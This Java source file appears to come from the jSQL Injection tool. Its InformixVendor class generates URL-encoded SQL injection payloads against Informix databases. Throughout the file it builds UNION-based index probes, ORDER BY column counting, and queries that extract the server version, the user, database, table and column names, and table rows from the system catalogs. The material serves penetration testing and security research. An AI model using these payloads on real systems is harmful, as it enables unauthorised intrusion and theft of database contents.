package com.jsql.model.injection.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.util.StringUtil;

public class InformixVendor extends AbstractVendor {

    @Override
    public String getSqlInfos() {
        return
            "SELECT+trim(DBINFO('version','full')||'%04'||DBSERVERNAME||'%04'||USER||'%01%03%03%07')r+FROM+TABLE(SET{1})";
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+rr||'%01%03%03%07'+r+from(select'%04'||trim(t.name)||'%050%04'rr+" +
            "from(select+distinct+name+from+sysdatabases)t,(select+distinct+name+from+sysdatabases)t1+" +
            "where+t.name>=t1.name+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+rr||'%01%03%03%07'+r+from(select+'%04'||trim(t.tabname)||'%050%04'rr+" +
            "from(select+distinct+tabname+from+" + database + ":systables)t,(select+distinct+tabname+from+" + database + ":systables)t1+" +
            "where+t.tabname>=t1.tabname+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+rr||'%01%03%03%07'+r+from(select+'%04'||trim(t.colname)||'%050%04'rr+" +
            "from(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t,(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t1+" +
            "where+t.colname>=t1.colname+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        formatListColumn = formatListColumn.replace("{%}", ",''))||'%7f'||trim(nvl(");
        formatListColumn = "trim(nvl(" + formatListColumn + ",''))";

        return
            "select+rr||'%01%03%03%07'+r+from(select'%04'||trim(t.s)||'%050%04'rr+" +
            "from(select+distinct+" + formatListColumn +"s+from+" + database + ":" + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ":" + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
            "select'SQLi'||substr(r," + startPosition + ",32767)from(" + sqlQuery + ")x";
    }

    @Override
    public String getSqlIndicesCapacityCheck(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select(1337"+ i +"7330%2b1)||''FROM+TABLE(SET{1})";
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")b+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
}